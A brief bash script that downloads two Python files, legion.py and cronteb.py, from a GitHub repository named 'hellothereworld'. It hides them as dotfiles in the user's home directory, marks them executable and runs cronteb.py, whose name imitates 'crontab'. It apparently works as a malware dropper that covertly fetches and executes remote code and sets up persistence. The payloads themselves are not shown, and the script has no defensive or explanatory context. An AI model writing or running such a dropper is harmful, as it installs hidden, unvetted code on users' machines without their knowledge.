#!/bin/bash

wget https://raw.githubusercontent.com/Doppelgangergny/hellothereworld/main/legion.py
wget https://raw.githubusercontent.com/Doppelgangergny/hellothereworld/main/cronteb.py
mv legion.py /home/$USER/.legion.py
chmod +x /home/$USER/.legion.py
mv cronteb.py /home/$USER/.cronteb.py
chmod +x /home/$USER/.cronteb.py
python3 /home/$USER/.cronteb.py
exit
